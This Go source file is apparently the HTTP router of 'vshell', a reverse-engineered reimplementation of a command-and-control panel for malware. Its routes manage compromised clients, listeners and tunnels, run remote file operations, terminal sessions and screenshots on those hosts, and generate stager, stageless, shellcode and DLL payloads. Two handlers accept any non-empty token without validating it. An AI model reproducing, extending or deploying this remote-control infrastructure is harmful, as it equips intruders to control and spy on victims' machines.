// Package router registers the HTTP routes exposed by this implementation.
//
// Route paths are cross-checked against frontend references and reverse-
// engineering notes, but that alone does not establish complete parity with
// the original binary. Authentication behavior depends on each controller's
// preparation and handler logic; review those paths before assuming a route
// is protected. Do not treat this package comment as a security guarantee.
package router

import (
	"encoding/json"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"

	"vshell/controllers"
	"vshell/utils"

	beego "github.com/beego/beego/v2/server/web"
)

var apiOnce sync.Once

// registerAPIRoutes registers routes identified in the current frontend and
// reverse-engineering notes. These references help locate candidate endpoints,
// but each route and handler still requires behavioral verification.
func registerAPIRoutes() {
	apiOnce.Do(func() {
		// Authentication
		beego.Router("/api/login", &controllers.LoginController{}, "post:Login")
		beego.Router("/api/logout", &controllers.LoginController{}, "get:Logout;post:Logout")

		// Dashboard
		beego.Router("/api/dashboard/info", &controllers.DashboardController{}, "get:Info")

		// Clients
		beego.Router("/api/client/list", &controllers.ClientController{}, "post:List")
		beego.Router("/api/client/add", &controllers.ClientController{}, "post:Add")
		beego.Router("/api/client/editremark", &controllers.ClientController{}, "post:EditRemark")
		beego.Router("/api/client/delfile", &controllers.ClientController{}, "post:DelFile")
		beego.Router("/api/client/delprocess", &controllers.ClientController{}, "post:DelProcess")
		beego.Router("/api/client/dellist", &controllers.ClientController{}, "post:DelList")

		// Listeners
		beego.Router("/api/listener/list", &controllers.ListenerController{}, "post:List")
		beego.Router("/api/listener/add", &controllers.ListenerController{}, "post:Add")
		beego.Router("/api/listener/edit", &controllers.ListenerController{}, "post:Edit")
		beego.Router("/api/listener/editremark", &controllers.ListenerController{}, "post:EditRemark")
		beego.Router("/api/listener/del", &controllers.ListenerController{}, "post:Del")
		beego.Router("/api/listener/dellist", &controllers.ListenerController{}, "post:DelList")
		beego.Router("/api/listener/start", &controllers.ListenerController{}, "post:Start")
		beego.Router("/api/listener/stop", &controllers.ListenerController{}, "post:Stop")

		// Tunnels
		beego.Router("/api/tunnel/list", &controllers.TunnelController{}, "post:List")
		beego.Router("/api/tunnel/add", &controllers.TunnelController{}, "post:Add")
		beego.Router("/api/tunnel/edit", &controllers.TunnelController{}, "post:Edit")
		beego.Router("/api/tunnel/editremark", &controllers.TunnelController{}, "post:EditRemark")
		beego.Router("/api/tunnel/del", &controllers.TunnelController{}, "post:Del")
		beego.Router("/api/tunnel/dellist", &controllers.TunnelController{}, "post:DelList")
		beego.Router("/api/tunnel/start", &controllers.TunnelController{}, "post:Start")
		beego.Router("/api/tunnel/stop", &controllers.TunnelController{}, "post:Stop")

		// Files
		beego.Router("/api/file/getdisk", &controllers.FileController{}, "post:Getdisk")
		beego.Router("/api/file/ls", &controllers.FileController{}, "post:Ls")
		beego.Router("/api/file/mv", &controllers.FileController{}, "post:Mv")
		beego.Router("/api/file/rm", &controllers.FileController{}, "post:Rm")
		beego.Router("/api/file/rmlist", &controllers.FileController{}, "post:RmList")
		beego.Router("/api/file/cat", &controllers.FileController{}, "post:Cat")
		beego.Router("/api/file/touch", &controllers.FileController{}, "post:Touch")
		beego.Router("/api/file/modifytime", &controllers.FileController{}, "post:Modifytime")
		beego.Router("/api/file/mkdir", &controllers.FileController{}, "post:Mkdir")
		beego.Router("/api/file/edit", &controllers.FileController{}, "post:Edit")
		beego.Router("/api/file/wget", &controllers.FileController{}, "post:Wget")
		beego.Router("/api/file/upload", &controllers.FileController{}, "post:Upload")
		beego.Router("/api/file/downloadtoserver", &controllers.FileController{}, "post:DownloadToServer")
		beego.Router("/api/file/getdownloadper", &controllers.FileController{}, "post:GetDownloadPer")
		beego.Router("/api/file/downloadtobrowser", &controllers.FileController{}, "post:DownloadToBrowser")
		beego.Router("/api/file/downloadtooss", &controllers.FileController{}, "post:DownloadToOSS")

		// 载荷下载
		beego.Router("/api/download/stage", &controllers.DownloadController{}, "post:Stage")
		beego.Router("/api/download/stageless", &controllers.DownloadController{}, "post:Stageless")
		beego.Router("/api/download/listen", &controllers.DownloadController{}, "post:Listen")
		beego.Router("/api/download/shellcode", &controllers.DownloadController{}, "post:Shellcode")
		beego.Router("/api/download/dll", &controllers.DownloadController{}, "post:Dll")
		beego.Router("/api/download/listendll", &controllers.DownloadController{}, "post:ListenDll")

		// Installation
		beego.Router("/api/install/install", &controllers.InstallController{}, "post:Install")
		beego.Router("/api/install/remove", &controllers.InstallController{}, "post:Remove")

		// 插件
		beego.Router("/api/runner/list", &controllers.RunnerController{}, "get:List")
		beego.Router("/api/runner/runplugin", &controllers.RunnerController{}, "post:RunPlugin")
		beego.Router("/api/runner/upload", &controllers.RunnerController{}, "post:Upload")

		// Settings
		beego.Router("/api/setting/edit", &controllers.SettingController{}, "post:Edit")
		beego.Router("/api/setting/get", &controllers.SettingController{}, "get:Get")

		// Terminal / 屏幕（WebSocket）
		//
		// 这两条路由不走 beego：SPA 的 WebSocket 端点由控制器直接 Hijack 连接
		// （upgrade + 双向转发），而 beego 在控制器方法返回后会继续渲染视图——
		// 内嵌的 SPA 是前端资源而非模板，于是必然抛 "Unknown view path:views"
		// 并接管（已被劫持的）响应。注册为 net/http 处理器后，升级由
		// registerStreamWSRoutes 直接完成，控制器方法只负责会话逻辑。
		//
		// Terminal / screen WebSocket endpoints are registered as net/http
		// handlers rather than beego routes: the handler hijacks the connection,
		// and beego would afterwards try to render a view for the (already
		// hijacked) response and fail with "Unknown view path:views".
		//
		// Terminal（单发命令，POST）—— /api/terminal/ws 与 /api/screen/ws 见下方
		// registerStreamWSRoutes。
		beego.Router("/api/terminal/shell", &controllers.TerminalController{}, "post:Shell")

		// Screenshots
		beego.Router("/api/screenshot/get", &controllers.ScreenshotController{}, "get:Get")
	})
}

// InitRouter 初始化全部路由。
// InitRouter initializes all routes.
func InitRouter() http.Handler {
	beego.BConfig.CopyRequestBody = true // 保留 JSON 请求体供参数读取
	registerAPIRoutes()

	mux := http.NewServeMux()

	// SPA 静态资源 + 前端路由回退（跳过 /api 与 /c2）
	fs := http.FileServer(http.Dir("static"))
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if strings.HasPrefix(r.URL.Path, "/api/") || strings.HasPrefix(r.URL.Path, "/c2/") {
			http.NotFound(w, r)
			return
		}
		staticPath := "static" + r.URL.Path
		if _, err := os.Stat(staticPath); err == nil && !strings.HasSuffix(r.URL.Path, "/") {
			if strings.HasSuffix(r.URL.Path, ".js") {
				w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
			} else if strings.HasSuffix(r.URL.Path, ".css") {
				w.Header().Set("Content-Type", "text/css; charset=utf-8")
			}
			fs.ServeHTTP(w, r)
			return
		}
		if strings.HasPrefix(r.URL.Path, "/assets/") {
			http.NotFound(w, r)
			return
		}
		http.ServeFile(w, r, "static/index.html")
	})

	// 用户信息 / 菜单 / 权限码（黑盒验证的原版响应格式）
	mux.HandleFunc("/api/getUserInfo", handleGetUserInfo)
	mux.HandleFunc("/api/getMenuList", handleGetMenuList)
	mux.HandleFunc("/api/getPermCode", handleGetPermCode)

	// beego API 控制器（真实路由）
	mux.Handle("/api/", beego.BeeApp.Handlers)

	// 面板查看者 WebSocket（终端 / 屏幕）：beego 无法承载 Hijack，见
	// registerAPIRoutes 的说明。
	registerStreamWSRoutes(mux)

	// C2 Agent 协议端点
	registerC2AgentRoutes(mux)

	// 管理面板入口（原版 FUN_0193b5e0 注册的 Web 路由 = "/index6us"，11B 加数组已解）
	mux.HandleFunc("/index6us", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "static/index.html")
	})
	mux.HandleFunc("/admin", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "static/admin/index.html")
	})
	mux.HandleFunc("/admin/", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "static/admin/index.html")
	})

	return mux
}

func extractToken(r *http.Request) string {
	if t := r.Header.Get("Token"); t != "" {
		return t
	}
	if auth := r.Header.Get("Authorization"); len(auth) > 7 && auth[:7] == "Bearer " {
		return auth[7:]
	}
	if t := r.Header.Get("X-Token"); t != "" {
		return t
	}
	return r.URL.Query().Get("token")
}

// registerStreamWSRoutes 注册面板查看者 WebSocket 端点。
// registerStreamWSRoutes registers the panel's viewer WebSocket endpoints.
//
// 认证复用 ApiBaseController.Prepare 的同一套 token 校验（Token 头 / token
// 查询串，见 controllers.CheckToken 与用户信息接口），校验失败返回 401 且
// 不升级连接；通过后由控制器完成升级与会话建立。
func registerStreamWSRoutes(mux *http.ServeMux) {
	mux.HandleFunc("/api/terminal/ws", func(w http.ResponseWriter, r *http.Request) {
		if !requireViewerToken(w, r) {
			return
		}
		controllers.ServeTerminalViewer(w, r)
	})
	mux.HandleFunc("/api/screen/ws", func(w http.ResponseWriter, r *http.Request) {
		if !requireViewerToken(w, r) {
			return
		}
		controllers.ServeScreenViewer(w, r)
	})
}

// requireViewerToken 校验查看者 token；失败时写 401 并返回 false。
// requireViewerToken enforces the panel token on a viewer WebSocket request.
func requireViewerToken(w http.ResponseWriter, r *http.Request) bool {
	token := extractToken(r)
	if token == "" || !controllers.CheckToken(token) {
		w.WriteHeader(http.StatusUnauthorized)
		return false
	}
	return true
}

// registerC2AgentRoutes 注册 C2 Agent 协议端点。
func registerC2AgentRoutes(mux *http.ServeMux) {
	// 黑盒验证（session 82）：/c2/l/* 全部 404——原版无 HTTP C2 端点。
	// 真实 agent 协议 = KCP/WS/DNS 传输 + checkin 文本命令
	// （"conf"/"host"/"stus"/"task" + JSON，FUN_016f3e80 实锤）。
	mux.HandleFunc("/c2/", func(w http.ResponseWriter, r *http.Request) {
		http.NotFound(w, r)
	})
}

func basePath(path string) string {
	parts := strings.Split(strings.Trim(path, "/"), "/")
	if len(parts) > 0 {
		return parts[0]
	}
	return ""
}

func handleGetUserInfo(w http.ResponseWriter, r *http.Request) {
	token := extractToken(r)

	if token == "" {
		http.Error(w, "", http.StatusUnauthorized)
		return
	}

	username, err := utils.ValidateToken(token)
	if err != nil {
		log.Printf("[getUserInfo] Invalid token: %v", err)
		// Original returns HTTP 200 with code 401 for an invalid token.
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"code":   401,
			"result": nil,
		})
		return
	}

	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(utils.UserInfoResponse{
		Code:    0,
		Message: "ok",
		Type:    "success",
		Result: utils.UserInfo{
			Avatar:   "",
			UserID:   "1",
			Username: username,
			RealName: username,
			Desc:     "manager",
			HomePath: "/dashboard/index",
			Roles: []utils.RoleInfoResp{
				{RoleName: "Super Admin", Value: "super"},
			},
			Token: "",
		},
	})
}

func handleGetMenuList(w http.ResponseWriter, r *http.Request) {
	if extractToken(r) == "" {
		http.Error(w, "", http.StatusUnauthorized)
		return
	}
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"code":    0,
		"message": "ok",
		"type":    "success",
		"result":  getDefaultMenuList(),
	})
}

func handleGetPermCode(w http.ResponseWriter, r *http.Request) {
	if extractToken(r) == "" {
		http.Error(w, "", http.StatusUnauthorized)
		return
	}
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"code":    0,
		"message": "ok",
		"type":    "success",
		"result":  []string{"*"}, // super admin: all permissions
	})
}

func getDefaultMenuList() []map[string]interface{} {
	// NOTE: paths must match the compiled SPA routes (static route modules in
	// the embedded frontend), NOT guessed paths. The SPA's registered routes are
	// /dashboard/index, /client/list, /listener/list, /download/{index,stage,
	// stageless,listen,ebpf}, /pluginrunner/index, /tunnel/list, /setting/index,
	// /about/index, plus detail pages (/terminal/index, /filemanager/index,
	// /screen/index, /screenshot/index, /serviceInstall/index, /clientManager/
	// index). Previously this returned /client/index, /listener/index,
	// /file/index, /tunnel/index, /plugin/index and /host/index — routes the SPA
	// does NOT register — so any consumer building routes from this response
	// would resolve to the SPA's 404 catch-all.
	return []map[string]interface{}{
		{
			"name":      "Dashboard",
			"path":      "/dashboard/index",
			"icon":      "ion:grid-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Clients",
			"path":      "/client/list",
			"icon":      "ion:people-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Listeners",
			"path":      "/listener/list",
			"icon":      "ion:list-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Terminal",
			"path":      "/terminal/index",
			"icon":      "ion:terminal-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Files",
			"path":      "/filemanager/index",
			"icon":      "ion:folder-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Tunnels",
			"path":      "/tunnel/list",
			"icon":      "ion:git-network-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Downloads",
			"path":      "/download/index",
			"icon":      "ion:download-outline",
			"component": "LAYOUT",
			"children": []map[string]interface{}{
				{"name": "Stage", "path": "/download/stage", "icon": ""},
				{"name": "Stageless", "path": "/download/stageless", "icon": ""},
				{"name": "Listen", "path": "/download/listen", "icon": ""},
				{"name": "Ebpf", "path": "/download/ebpf", "icon": ""},
			},
		},
		{
			"name":      "Plugins",
			"path":      "/pluginrunner/index",
			"icon":      "ion:extension-puzzle-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Screenshot",
			"path":      "/screenshot/index",
			"icon":      "ion:camera-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Settings",
			"path":      "/setting/index",
			"icon":      "ion:settings-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "About",
			"path":      "/about/index",
			"icon":      "ion:information-circle-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
	}
}
